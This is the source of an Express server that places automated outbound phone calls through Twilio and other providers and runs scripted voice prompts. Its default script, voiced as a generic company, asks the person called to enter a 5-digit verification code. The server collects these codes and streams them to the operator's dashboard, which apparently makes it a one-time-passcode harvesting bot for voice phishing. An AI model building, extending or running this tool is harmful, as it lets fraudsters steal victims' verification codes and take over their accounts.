require("dotenv").config();
const express = require("express");
const cors = require("cors");
const fs = require("fs");
const path = require("path");

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(cors());
app.use(express.static(path.join(__dirname, "public")));

// ── ID generator (no external package needed) ────────────────────────────────
function uid() { return Date.now().toString(36) + Math.random().toString(36).slice(2); }

// ── File storage ─────────────────────────────────────────────────────────────
const DATA = path.join(__dirname, "data");
if (!fs.existsSync(DATA)) fs.mkdirSync(DATA);
const F = {
  settings: path.join(DATA, "settings.json"),
  scripts:  path.join(DATA, "scripts.json"),
  logs:     path.join(DATA, "logs.json"),
};

function rj(file, def) {
  try { if (fs.existsSync(file)) return JSON.parse(fs.readFileSync(file, "utf8")); } catch(e) {}
  return typeof def === "function" ? def() : JSON.parse(JSON.stringify(def));
}
function wj(file, data) { fs.writeFileSync(file, JSON.stringify(data, null, 2)); }

// ── Default data ─────────────────────────────────────────────────────────────
const DEF_SETTINGS = {
  provider: "twilio",
  companyName: "My Company",
  voice: "alice",
  language: "en-US",
  twilio:       { accountSid:"", authToken:"", fromNumber:"", baseUrl:"" },
  signalwire:   { projectId:"",  authToken:"", fromNumber:"", baseUrl:"", spaceUrl:"" },
  vonage:       { apiKey:"",     apiSecret:"", fromNumber:"", baseUrl:"" },
  plivo:        { authId:"",     authToken:"", fromNumber:"", baseUrl:"" },
  africastalking:{ username:"",  apiKey:"",    fromNumber:"", baseUrl:"" },
  telnyx:       { apiKey:"",     fromNumber:"", baseUrl:"" }
};

const DEF_SCRIPT = {
  id: "default", name: "Default Script", isDefault: true,
  createdAt: new Date().toISOString(),
  greeting: { message: "Hello! This is a call from our company. Press 1 to continue, or press 2 to end this call.", timeout: 10, noInputMessage: "We did not receive your input. Goodbye." },
  steps: [{ label: "Verification Code", message: "Please enter your 5-digit verification code, then press the hash key.", maxDigits: 5, timeout: 15, confirmMessage: "Thank you. " }],
  successMessage: "Thank you. Your information has been received. Have a wonderful day. Goodbye.",
  cancelMessage: "No problem. Your request has been cancelled. Goodbye.",
  errorMessage: "We did not receive your input. Please call us back. Goodbye."
};

function loadSettings() { return { ...DEF_SETTINGS, ...rj(F.settings, DEF_SETTINGS) }; }
function saveSettings(d) { wj(F.settings, d); }
function loadScripts() { const s = rj(F.scripts, null); return (s && s.length) ? s : [JSON.parse(JSON.stringify(DEF_SCRIPT))]; }
function saveScripts(d) { wj(F.scripts, d); }
function loadLogs() { return rj(F.logs, []); }
function saveLogs(d) { wj(F.logs, d); }

// ── Build provider client ────────────────────────────────────────────────────
function makeClient(settings) {
  const p = settings.provider || "twilio";
  const twilio = require("twilio");

  if (p === "twilio") {
    const c = settings.twilio;
    if (!c.accountSid || !c.authToken) return null;
    return { type:"twilio", client: twilio(c.accountSid, c.authToken), from: c.fromNumber, baseUrl: c.baseUrl, sid: c.accountSid };
  }
  if (p === "signalwire") {
    const c = settings.signalwire;
    if (!c.projectId || !c.authToken) return null;
    const client = twilio(c.projectId, c.authToken, { accountSid: c.projectId, lazyLoading: true });
    return { type:"signalwire", client, from: c.fromNumber, baseUrl: c.baseUrl, sid: c.projectId };
  }
  if (p === "vonage") {
    const c = settings.vonage;
    if (!c.apiKey || !c.apiSecret) return null;
    // Vonage uses REST API directly - return config for manual HTTP calls
    return { type:"vonage", apiKey: c.apiKey, apiSecret: c.apiSecret, from: c.fromNumber, baseUrl: c.baseUrl };
  }
  if (p === "plivo") {
    const c = settings.plivo;
    if (!c.authId || !c.authToken) return null;
    return { type:"plivo", authId: c.authId, authToken: c.authToken, from: c.fromNumber, baseUrl: c.baseUrl };
  }
  if (p === "africastalking") {
    const c = settings.africastalking;
    if (!c.username || !c.apiKey) return null;
    return { type:"africastalking", username: c.username, apiKey: c.apiKey, from: c.fromNumber, baseUrl: c.baseUrl };
  }
  if (p === "telnyx") {
    const c = settings.telnyx;
    if (!c.apiKey) return null;
    return { type:"telnyx", apiKey: c.apiKey, from: c.fromNumber, baseUrl: c.baseUrl };
  }
  return null;
}

// ── Make outbound call (supports multiple providers) ─────────────────────────
async function makeCall(ctx, to, twimlUrl, statusUrl) {
  const https = require("https");
  const qs = require("querystring");

  if (ctx.type === "twilio" || ctx.type === "signalwire") {
    const call = await ctx.client.calls.create({
      to, from: ctx.from, url: twimlUrl,
      statusCallback: statusUrl, statusCallbackMethod: "POST",
      statusCallbackEvent: ["initiated","ringing","answered","completed"]
    });
    return call.sid;
  }

  if (ctx.type === "plivo") {
    const body = JSON.stringify({ to, from: ctx.from, answer_url: twimlUrl, hangup_url: statusUrl });
    const resp = await fetch("https://api.plivo.com/v1/Account/" + ctx.authId + "/Call/", {
      method: "POST",
      headers: { "Content-Type":"application/json", "Authorization":"Basic " + Buffer.from(ctx.authId + ":" + ctx.authToken).toString("base64") },
      body
    });
    const d = await resp.json();
    return d.request_uuid || d.call_uuid || uid();
  }

  if (ctx.type === "africastalking") {
    const body = new URLSearchParams({ username: ctx.username, to, from: ctx.from, url: twimlUrl });
    const resp = await fetch("https://voice.africastalking.com/call", {
      method: "POST",
      headers: { "Content-Type":"application/x-www-form-urlencoded", "apiKey": ctx.apiKey, "Accept":"application/json" },
      body: body.toString()
    });
    const d = await resp.json();
    return d.entries?.[0]?.sessionId || uid();
  }

  if (ctx.type === "telnyx") {
    const resp = await fetch("https://api.telnyx.com/v2/calls", {
      method: "POST",
      headers: { "Content-Type":"application/json", "Authorization":"Bearer " + ctx.apiKey },
      body: JSON.stringify({ to, from: ctx.from, connection_id: ctx.from, webhook_url: statusUrl, answering_machine_detection: "disabled" })
    });
    const d = await resp.json();
    return d.data?.call_control_id || uid();
  }

  throw new Error("Provider " + ctx.type + " not supported for outbound calls yet.");
}

// ── Active sessions ───────────────────────────────────────────────────────────
const sessions = {};
function syncLog(s) {
  const logs = loadLogs();
  const i = logs.findIndex(l => l.callSid === s.callSid);
  if (i >= 0) logs[i] = { ...logs[i], ...s }; else logs.unshift(s);
  saveLogs(logs);
}

// ════════════════════════════════════════════════════════════════════════════
//  API ROUTES
// ════════════════════════════════════════════════════════════════════════════

// Settings
app.get("/api/settings", (req,res) => {
  const s = loadSettings();
  const safe = JSON.parse(JSON.stringify(s));
  // Mask tokens
  ["twilio","signalwire","vonage","plivo","africastalking","telnyx"].forEach(p => {
    if (safe[p] && safe[p].authToken) safe[p].authToken = "••••" + safe[p].authToken.slice(-4);
    if (safe[p] && safe[p].apiKey && p !== "africastalking") safe[p].apiKey = "••••" + safe[p].apiKey.slice(-4);
    if (safe[p] && safe[p].apiSecret) safe[p].apiSecret = "••••" + safe[p].apiSecret.slice(-4);
  });
  res.json(safe);
});

app.post("/api/settings", (req,res) => {
  const cur = loadSettings();
  const body = req.body;
  const updated = { ...cur, ...body };
  // Merge provider objects, preserve masked values
  ["twilio","signalwire","vonage","plivo","africastalking","telnyx"].forEach(p => {
    if (body[p]) {
      updated[p] = { ...cur[p], ...body[p] };
      if (body[p].authToken  && body[p].authToken.startsWith("••••"))  updated[p].authToken  = cur[p].authToken;
      if (body[p].apiKey     && body[p].apiKey.startsWith("••••"))     updated[p].apiKey     = cur[p].apiKey;
      if (body[p].apiSecret  && body[p].apiSecret.startsWith("••••"))  updated[p].apiSecret  = cur[p].apiSecret;
    }
  });
  saveSettings(updated);
  res.json({ success: true });
});

// Test connection
app.get("/api/test", async (req,res) => {
  const s = loadSettings();
  const ctx = makeClient(s);
  if (!ctx) return res.json({ ok:false, error:"Credentials not configured for " + s.provider + ". Check Settings tab." });
  if (!ctx.from) return res.json({ ok:false, error:"Phone number not set for " + s.provider + "." });
  if (!ctx.baseUrl) return res.json({ ok:false, error:"Server URL not set. Click Auto-detect in Settings." });
  try {
    if ((ctx.type === "twilio" || ctx.type === "signalwire") && ctx.client) {
      const acct = await ctx.client.api.accounts(ctx.sid).fetch();
      return res.json({ ok:true, provider: ctx.type, name: acct.friendlyName });
    }
    return res.json({ ok:true, provider: ctx.type, name: "Credentials saved ✓" });
  } catch(err) { res.json({ ok:false, error: err.message }); }
});

// Scripts
app.get("/api/scripts", (req,res) => res.json(loadScripts()));

app.post("/api/scripts", (req,res) => {
  const scripts = loadScripts();
  const body = req.body;
  if (body.id) {
    const i = scripts.findIndex(s => s.id === body.id);
    if (i >= 0) scripts[i] = { ...scripts[i], ...body, updatedAt: new Date().toISOString() };
    else scripts.push({ ...body, createdAt: new Date().toISOString() });
  } else {
    scripts.push({ ...body, id: uid(), createdAt: new Date().toISOString() });
  }
  saveScripts(scripts);
  res.json({ success:true, scripts });
});

app.delete("/api/scripts/:id", (req,res) => {
  let scripts = loadScripts();
  if (scripts.length <= 1) return res.status(400).json({ error:"Cannot delete the last script." });
  scripts = scripts.filter(s => s.id !== req.params.id);
  if (!scripts.find(s => s.isDefault)) scripts[0].isDefault = true;
  saveScripts(scripts);
  res.json({ success:true, scripts });
});

app.post("/api/scripts/:id/setdefault", (req,res) => {
  const scripts = loadScripts();
  scripts.forEach(s => s.isDefault = s.id === req.params.id);
  saveScripts(scripts);
  const settings = loadSettings();
  settings.activeScriptId = req.params.id;
  saveSettings(settings);
  res.json({ success:true });
});

// Logs
app.get("/api/logs", (req,res) => res.json(loadLogs()));
app.delete("/api/logs/:id", (req,res) => { saveLogs(loadLogs().filter(l => l.id !== req.params.id)); res.json({ success:true }); });
app.delete("/api/logs", (req,res) => { saveLogs([]); res.json({ success:true }); });

// Sessions
app.get("/api/sessions", (req,res) => {
  res.json(Object.values(sessions).sort((a,b) => new Date(b.startTime)-new Date(a.startTime)));
});

// Initiate call
app.post("/api/call", async (req,res) => {
  const { phoneNumber, label, scriptId } = req.body;
  if (!phoneNumber) return res.status(400).json({ error:"Phone number required." });
  const settings = loadSettings();
  const ctx = makeClient(settings);
  if (!ctx) return res.status(400).json({ error:"Provider credentials not configured. Go to Settings tab." });
  const scripts = loadScripts();
  const script = (scriptId ? scripts.find(s=>s.id===scriptId) : null) || scripts.find(s=>s.isDefault) || scripts[0];
  if (!script) return res.status(400).json({ error:"No script found." });
  try {
    const callSid = await makeCall(
      ctx, phoneNumber,
      ctx.baseUrl + "/twiml/start?sid=" + script.id,
      ctx.baseUrl + "/twiml/status"
    );
    const entry = {
      id: uid(), callSid, phone: phoneNumber, label: label||"Call",
      scriptName: script.name, provider: ctx.type,
      status:"initiated", statusDetail:"Dialing...",
      startTime: new Date().toISOString(), endTime:null, duration:null,
      currentStep:-1, collected:[], steps: script.steps.length
    };
    sessions[callSid] = entry;
    const logs = loadLogs(); logs.unshift(entry); saveLogs(logs);
    res.json({ success:true, callSid });
  } catch(err) { res.status(500).json({ error: err.message }); }
});

// End call
app.post("/api/call/:sid/end", async (req,res) => {
  const { sid } = req.params;
  const settings = loadSettings();
  const ctx = makeClient(settings);
  try {
    if (ctx && (ctx.type==="twilio"||ctx.type==="signalwire") && ctx.client) {
      await ctx.client.calls(sid).update({ status:"completed" });
    }
    if (sessions[sid]) { sessions[sid].status="ended-by-user"; sessions[sid].statusDetail="Ended by you"; syncLog(sessions[sid]); }
    res.json({ success:true });
  } catch(err) { res.status(500).json({ error:err.message }); }
});

// ── TwiML ────────────────────────────────────────────────────────────────────
function voice() { const s=loadSettings(); return { voice:s.voice||"alice", language:s.language||"en-US" }; }
function baseUrl() { const s=loadSettings(); const p=s.provider||"twilio"; const c=s[p]||{}; return c.baseUrl||""; }
function getScript(id) { const ss=loadScripts(); return ss.find(s=>s.id===id)||ss[0]; }

app.post("/twiml/start", (req,res) => {
  const { voice:v, language:lang } = voice();
  const script = getScript(req.query.sid);
  const base = baseUrl();
  const sid = req.body.CallSid;
  if (sessions[sid]) { sessions[sid].status="ringing"; sessions[sid].statusDetail="Playing greeting..."; syncLog(sessions[sid]); }
  const { VoiceResponse } = require("twilio").twiml;
  const twiml = new VoiceResponse();
  const g = twiml.gather({ numDigits:1, action:base+"/twiml/greet?sid="+script.id, method:"POST", timeout:script.greeting.timeout });
  g.say({ voice:v, language:lang }, script.greeting.message);
  twiml.say({ voice:v, language:lang }, script.greeting.noInputMessage);
  twiml.hangup();
  res.type("text/xml").send(twiml.toString());
});

app.post("/twiml/greet", (req,res) => {
  const { voice:v, language:lang } = voice();
  const script = getScript(req.query.sid);
  const base = baseUrl();
  const sid = req.body.CallSid;
  const digit = req.body.Digits;
  const { VoiceResponse } = require("twilio").twiml;
  const twiml = new VoiceResponse();
  if (digit === "2") {
    if (sessions[sid]) { sessions[sid].status="cancelled"; sessions[sid].statusDetail="Caller declined"; syncLog(sessions[sid]); }
    twiml.say({ voice:v, language:lang }, script.cancelMessage); twiml.hangup();
    return res.type("text/xml").send(twiml.toString());
  }
  if (digit === "1") {
    if (sessions[sid]) { sessions[sid].status="in-progress"; sessions[sid].statusDetail="Accepted"; syncLog(sessions[sid]); }
    return res.redirect(307, base+"/twiml/step/0?sid="+script.id);
  }
  twiml.say({ voice:v, language:lang }, "Invalid input. " + script.greeting.message);
  twiml.redirect(base+"/twiml/start?sid="+script.id);
  res.type("text/xml").send(twiml.toString());
});

app.all("/twiml/step/:idx", (req,res) => {
  const { voice:v, language:lang } = voice();
  const script = getScript(req.query.sid);
  const base = baseUrl();
  const idx = parseInt(req.params.idx, 10);
  const step = script.steps[idx];
  const sid = req.body.CallSid;
  const { VoiceResponse } = require("twilio").twiml;
  const twiml = new VoiceResponse();
  if (!step) {
    if (sessions[sid]) { sessions[sid].status="completed"; sessions[sid].statusDetail="All steps done"; syncLog(sessions[sid]); }
    twiml.say({ voice:v, language:lang }, script.successMessage); twiml.hangup();
    return res.type("text/xml").send(twiml.toString());
  }
  if (sessions[sid]) { sessions[sid].currentStep=idx; sessions[sid].statusDetail="Waiting: "+step.label; syncLog(sessions[sid]); }
  const g = twiml.gather({ numDigits:step.maxDigits, finishOnKey:"#", action:base+"/twiml/collect/"+idx+"?sid="+script.id, method:"POST", timeout:step.timeout });
  g.say({ voice:v, language:lang }, step.message);
  twiml.say({ voice:v, language:lang }, script.errorMessage);
  twiml.hangup();
  res.type("text/xml").send(twiml.toString());
});

app.post("/twiml/collect/:idx", (req,res) => {
  const { voice:v, language:lang } = voice();
  const script = getScript(req.query.sid);
  const base = baseUrl();
  const idx = parseInt(req.params.idx, 10);
  const sid = req.body.CallSid;
  const digits = req.body.Digits || "";
  const step = script.steps[idx];
  const { VoiceResponse } = require("twilio").twiml;
  const twiml = new VoiceResponse();

  // ── Input validation ──────────────────────────────────────────────────────
  const expected = step.maxDigits;
  const actual = digits.length;
  if (actual < expected) {
    // Too short — re-prompt
    twiml.say({ voice:v, language:lang },
      "That code is too short. You entered " + actual + " digit" + (actual===1?"":"s") +
      " but we need " + expected + " digits. Please try again."
    );
    const g = twiml.gather({ numDigits:expected, finishOnKey:"#", action:base+"/twiml/collect/"+idx+"?sid="+script.id, method:"POST", timeout:step.timeout });
    g.say({ voice:v, language:lang }, step.message);
    return res.type("text/xml").send(twiml.toString());
  }
  if (actual > expected) {
    // Too long — re-prompt
    twiml.say({ voice:v, language:lang },
      "That code is too long. You entered " + actual + " digit" + (actual===1?"":"s") +
      " but we need exactly " + expected + " digits. Please try again."
    );
    const g = twiml.gather({ numDigits:expected, finishOnKey:"#", action:base+"/twiml/collect/"+idx+"?sid="+script.id, method:"POST", timeout:step.timeout });
    g.say({ voice:v, language:lang }, step.message);
    return res.type("text/xml").send(twiml.toString());
  }

  // ── Valid — save and continue ─────────────────────────────────────────────
  if (sessions[sid]) {
    sessions[sid].collected.push({ step:idx, label:step.label, value:digits, time:new Date().toISOString() });
    sessions[sid].currentStep = idx+1;
    sessions[sid].statusDetail = "Received: " + step.label;
    syncLog(sessions[sid]);
  }
  if (step.confirmMessage) twiml.say({ voice:v, language:lang }, step.confirmMessage);
  twiml.redirect(base+"/twiml/step/"+(idx+1)+"?sid="+script.id);
  res.type("text/xml").send(twiml.toString());
});

app.post("/twiml/status", (req,res) => {
  const sid = req.body.CallSid;
  const cs = req.body.CallStatus;
  const dur = req.body.CallDuration;
  if (sessions[sid]) {
    const s = sessions[sid];
    if (cs==="ringing") s.statusDetail="Ringing...";
    else if (cs==="answered") { s.status="in-progress"; s.statusDetail="Connected"; }
    else if (cs==="completed" && !["cancelled","completed","ended-by-user"].includes(s.status)) { s.status="completed"; s.statusDetail="Completed"; }
    else if (["no-answer","busy","failed"].includes(cs)) { s.status=cs; s.statusDetail=cs.replace("-"," "); }
    if (dur) s.duration = parseInt(dur);
    if (["completed","cancelled","no-answer","busy","failed"].includes(cs)) s.endTime = new Date().toISOString();
    syncLog(s);
  }
  res.sendStatus(200);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("\n✅ IVR Pro v4 → http://localhost:" + PORT + "\n"));
